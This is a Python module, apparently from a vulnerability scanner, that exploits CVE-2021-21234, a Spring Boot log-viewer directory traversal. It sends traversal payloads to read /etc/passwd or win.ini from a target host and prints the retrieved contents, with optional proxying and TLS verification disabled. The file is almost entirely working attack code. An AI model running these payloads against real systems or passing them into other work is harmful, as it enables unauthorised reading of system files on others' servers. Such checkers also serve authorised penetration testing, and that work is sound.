import requests
import time
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin

cdd=''
http = ''
https = ''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        payload1 = 'manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../'
        payload2 = 'log/view?filename=/windows/win.ini&base=../../../../../../../../../../'
        payload3 = 'manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../'
        payload4 = 'log/view?filename=/etc/passwd&base=../../../../../../../../../../'
        logging.captureWarnings(True)
        aa1 = requests.post(url1 + payload1, cookies=s_cookie, proxies=proxies, verify=False, timeout=5)
        aa2 = requests.post(url1 + payload2, cookies=s_cookie, proxies=proxies, verify=False, timeout=5)
        aa3 = requests.post(url1 + payload3, cookies=s_cookie, proxies=proxies, verify=False, timeout=5)
        aa4 = requests.post(url1 + payload4, cookies=s_cookie, proxies=proxies, verify=False, timeout=5)
        if (('MAPI' in str(aa1.text)) or ('MAPI' in str(aa2.text))):
            cdd='[+]CVE-2021-21234-Win\n'+str(aa1.text)+str(aa2.text)
        elif (('root:x:' in str(aa3.text)) or ('root:x:' in str(aa4.text))):
            cdd = '[+]CVE-2021-21234-Linux\n' + str(aa3.text) + str(aa4.text)
        else:
            cdd='[-]漏洞不存在\n'
    except Exception as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ Spring Boot目录遍历 ]\n\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)